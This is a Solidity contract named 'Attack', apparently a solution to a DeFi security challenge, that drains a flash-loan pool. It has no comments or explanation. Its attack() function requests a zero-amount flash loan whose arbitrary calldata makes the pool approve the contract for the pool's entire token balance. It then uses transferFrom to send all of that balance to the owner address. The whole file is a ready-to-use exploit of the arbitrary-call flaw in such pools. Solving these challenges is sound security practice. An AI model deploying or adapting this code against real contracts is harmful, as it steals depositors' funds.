// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface Pool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract Attack {
    Pool pool;
    IERC20 token;
    address owner;

    constructor(
        address _pool,
        address _token,
        address _owner
    ) {
        pool = Pool(_pool);
        token = IERC20(_token);
        owner = _owner;
    }

    function attack() public {
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                balance
            )
        );
        token.transferFrom(address(pool), owner, balance);
    }
}
